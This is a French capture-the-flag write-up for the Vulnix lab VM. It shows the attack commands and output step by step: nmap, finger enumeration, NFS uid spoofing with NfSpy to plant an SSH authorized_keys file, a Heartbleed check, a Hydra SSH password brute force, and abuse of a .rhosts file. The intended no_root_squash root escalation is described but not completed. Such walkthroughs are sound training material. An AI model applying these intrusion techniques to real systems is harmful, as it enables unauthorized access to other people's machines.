# Solution du CTF HackLAB: Vulnix

Nom de Zeus !
-------------

[Vulnix](http://vulnhub.com/entry/hacklab-vulnix,48/) est un CTF basé sur un système *Ubuntu* sur lequel ont été ajouté des services un peu vieillots.  

A cause d'un problème avec la VM je n'ai pas pu aller jusqu'au boût mais la solution vous apprendra peut être malgré tout quelques vieilles astuces.  

Les années 90 ont appelées, elles veulent récupérer leurs services
------------------------------------------------------------------

finger, NFS, rsh, rexec, rlogin ça ne vous dit rien ? Mais si, rappellez-vous cet affreux tonton barbu, ex-administrateur système, qui voulait vous faire installer une *Slackware* (le salaud !) et vous parlait de Gnous (wtf !?)  

```plain
Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-02 21:30 CEST
Nmap scan report for 192.168.1.54
Host is up (0.00025s latency).
Not shown: 65518 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=vulnix
| Not valid before: 2012-09-02T16:40:12+00:00
|_Not valid after:  2022-08-31T16:40:12+00:00
|_ssl-date: 2014-07-02T19:30:51+00:00; 0s from local time.
79/tcp    open  finger     Linux fingerd
|_finger: No one logged on.
110/tcp   open  pop3       Dovecot pop3d
|_pop3-capabilities: UIDL STLS PIPELINING CAPA TOP SASL RESP-CODES
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      36163/tcp  mountd
|   100005  1,2,3      36504/udp  mountd
|   100021  1,3,4      39257/udp  nlockmgr
|   100021  1,3,4      54714/tcp  nlockmgr
|   100024  1          41997/tcp  status
|   100024  1          60301/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
143/tcp   open  imap       Dovecot imapd
|_imap-capabilities: LOGINDISABLEDA0001 more have capabilities SASL-IR ID listed ENABLE LOGIN-REFERRALS post-login IDLE OK STARTTLS Pre-login IMAP4rev1 LITERAL+
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imap   Dovecot imapd
|_imap-capabilities: more have AUTH=PLAINA0001 SASL-IR ID listed ENABLE LOGIN-REFERRALS post-login LITERAL+ OK capabilities Pre-login IMAP4rev1 IDLE
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T16:40:22+00:00
|_Not valid after:  2022-09-02T16:40:22+00:00
|_ssl-date: 2014-07-02T19:30:51+00:00; 0s from local time.
995/tcp   open  ssl/pop3   Dovecot pop3d
|_pop3-capabilities: UIDL PIPELINING CAPA SASL(PLAIN) TOP USER RESP-CODES
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T16:40:22+00:00
|_Not valid after:  2022-09-02T16:40:22+00:00
|_ssl-date: 2014-07-02T19:30:51+00:00; 0s from local time.
2049/tcp  open  nfs        2-4 (RPC #100003)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      36163/tcp  mountd
|   100005  1,2,3      36504/udp  mountd
|   100021  1,3,4      39257/udp  nlockmgr
|   100021  1,3,4      54714/tcp  nlockmgr
|   100024  1          41997/tcp  status
|   100024  1          60301/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
36163/tcp open  mountd     1-3 (RPC #100005)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      36163/tcp  mountd
|   100005  1,2,3      36504/udp  mountd
|   100021  1,3,4      39257/udp  nlockmgr
|   100021  1,3,4      54714/tcp  nlockmgr
|   100024  1          41997/tcp  status
|   100024  1          60301/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
37230/tcp open  mountd     1-3 (RPC #100005)
37467/tcp open  mountd     1-3 (RPC #100005)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      36163/tcp  mountd
|   100005  1,2,3      36504/udp  mountd
|   100021  1,3,4      39257/udp  nlockmgr
|   100021  1,3,4      54714/tcp  nlockmgr
|   100024  1          41997/tcp  status
|   100024  1          60301/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
41997/tcp open  status     1 (RPC #100024)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      36163/tcp  mountd
|   100005  1,2,3      36504/udp  mountd
|   100021  1,3,4      39257/udp  nlockmgr
|   100021  1,3,4      54714/tcp  nlockmgr
|   100024  1          41997/tcp  status
|   100024  1          60301/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
54714/tcp open  nlockmgr   1-4 (RPC #100021)
MAC Address: 08:00:27:3C:77:4F (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.9
Network Distance: 1 hop
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Back to the future
------------------

Le service *finger* permet d'obtenir des informations sur les utilisateurs et donc potentiellement de les énumérer. Bref du vintage.  

```plain
$ finger user@192.168.1.54
Login: user                             Name: user
Directory: /home/user                   Shell: /bin/bash
On since Thu Jul  3 18:07 (BST) on pts/1 from 192.168.1.3
   4 minutes 18 seconds idle
No mail.
No Plan.

Login: dovenull                         Name: Dovecot login user
Directory: /nonexistent                 Shell: /bin/false
Never logged in.
No mail.
No Plan.
```

Le service NFS n'a aucun rapport avec *Need For Speed*, c'est un système de fichier réseau, un peu comme un SMB qu'il faudrait éviter d'utiliser.  

Le problème de ce service est que l'authentification se fait sur le user ID de l'utilisateur qui est facilement faussable (en recréant par exemple un compte avec les même uid et gid sur la machine de l'attaquant).  

On peut obtenir les partages exportés via showmount :  

```plain
# showmount -e 192.168.1.54
Export list for 192.168.1.54:
/home/vulnix *
```

L'outil de référence pour exploiter du NSF est [Nfspy](https://github.com/bonsaiviking/NfSpy). Il se charge automatiquement de mentir sur les IDs de l'utilisateur. J'uploade ici un fichier *authorized\_keys* qui me permettra de me connecter ensuite avec ma clé SSH :  

```plain
# PYTHONPATH=. ./scripts/nfspysh -o server=192.168.1.54:/home/vulnix
nfspy@192.168.1.54:/home/vulnix:/> ls
/:
040750   2008   2008        4096 2012-09-02 20:25:02 .
100644   2008   2008         220 2012-04-03 17:58:14 .bash_logout
100644   2008   2008         675 2012-04-03 17:58:14 .profile
040750   2008   2008        4096 2012-09-02 20:25:02 ..
100644   2008   2008        3486 2012-04-03 17:58:14 .bashrc
nfspy@192.168.1.54:/home/vulnix:/> mkdir .ssh
nfspy@192.168.1.54:/home/vulnix:/> cd .ssh
nfspy@192.168.1.54:/home/vulnix:/.ssh> put /tmp/authorized_keys
nfspy@192.168.1.54:/home/vulnix:/.ssh> ls
/.ssh:
040755   2008   2008        4096 2014-07-02 21:58:37 .
100644   2008   2008         381 2014-07-02 21:58:37 authorized_keys
040750   2008   2008        4096 2014-07-02 21:56:05 ..
nfspy@192.168.1.54:/home/vulnix:/.ssh> exit
Quitting.
```

```plain
$ ssh vulnix@192.168.1.54
Enter passphrase for key '/home/devloop/.ssh/id_rsa': 
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Jul  2 21:00:17 BST 2014

  System load:  0.0              Processes:           87
  Usage of /:   90.2% of 773MB   Users logged in:     0
  Memory usage: 7%               IP address for eth0: 192.168.1.54
  Swap usage:   0%

  => / is using 90.2% of 773MB

  Graph this data and manage this system at https://landscape.canonical.com/                                                                                                                                   

vulnix@vulnix:~$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
vulnix@vulnix:~$ uname -a
Linux vulnix 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
vulnix@vulnix:~$ cat /etc/*release*
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04.1 LTS"
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```

L'utilisateur a des accès dans *sudoers* qui lui permettent (normalement) d'éditer le fichier */etc/exports* (où sont définis les partages NFS) avec *sudoedit*.  

L'éditeur prédéfini sur le système est nano (beurk). Il est possible de faire exécuter des commandes depuis *nano* via Ctrl+R puis Ctrl+X mais si on tente d'afficher le contenu de */etc/shadow* l'accès est refusé. De même si on fait exécuter *id* c'est bien les informations du compte *vulnix* qui apparaissent... Ça sent le bug dans la VM :(  

L'attaque attendue dans le challenge consiste normalement à modifier la ligne suivant du */etc/exports* :  

```plain
/home/vulnix    *(rw,root_squash)
```

Il faut changer l'option *root\_squash* en [no\_root\_squash](https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Security_Guide/sect-Security_Guide-Securing_NFS-Do_Not_Use_the_no_root_squash_Option.html) ce qui permet alors normalement d'uploader un binaire setuid 0 sans se faire éjecter.  

Malheureusement aucune tentative n'a réussie :( Allo *Doc* ? Une idée ?  

Les années 2010 sont arrivées sans prévenir
-------------------------------------------

Chose amusante : les ports *Dovecot* 993 et 995 sont vulnérables à *Heartbleed* (testé avec *hb-test.py* de *Jared Stafford*) mais il ne faut pas espérer quelque chose d'intéressant.  

```plain
$ python hb-test.py 192.168.1.54 -p 995
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 58
 ... received message: type = 22, ver = 0302, length = 921
 ... received message: type = 22, ver = 0302, length = 525
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
--- snip ---
  3ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

WARNING: server returned more data than it should - server is vulnerable!
```

Toc toc McFly
-------------

Ajouté à ça l'utilisateur *"user"* a un mot de passe facilement cassable.  

Ici j'ai utilisé *Hydra* avec une wordlist pompée [chez SkullSecurity](https://wiki.skullsecurity.org/Passwords) contenant les mots de passe les plus fréquents (dans l'ordre !)  

```plain
$ ./hydra -l user -P phpbb.txt  -e nsr ssh://192.168.1.54
Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2014-07-03 19:07:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 184392 login tries (l:1/p:184392), ~720 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.1.54   login: user   password: letmein
[STATUS] attack finished for 192.168.1.54 (waiting for children to finish) ...
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-07-03 19:07:33
```

Une fois connecté avec SSH :  

```plain
user@vulnix:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),100(users)
user@vulnix:~$ ls -al
total 28
drwxr-x--- 3 user user 4096 Sep  2  2012 .
drwxr-xr-x 4 root root 4096 Sep  2  2012 ..
-rw-r--r-- 1 user user  220 Sep  2  2012 .bash_logout
-rw-r--r-- 1 user user 3486 Sep  2  2012 .bashrc
drwx------ 2 user user 4096 Sep  2  2012 .cache
-rw-r--r-- 1 user user  675 Sep  2  2012 .profile
-rw------- 1 user user    7 Sep  2  2012 .rhosts
user@vulnix:~$ cat .rhosts 
+ user
```

Ajouté à ça, on peut se connecter en tant que *user* via les r\* services grâce au fichier *.rhosts* ! Il suffit de disposer d'un compte *user* sur la machine attaquante.  

Il manquait plus que du *NIS* et la boucle était bouclé. *NIS* ? ... Non, laissez tomber !  

Un challenge sympathique mais c'est dommage de ne pas avoir pu le terminer.

*Published July 04 2014 at 22:26*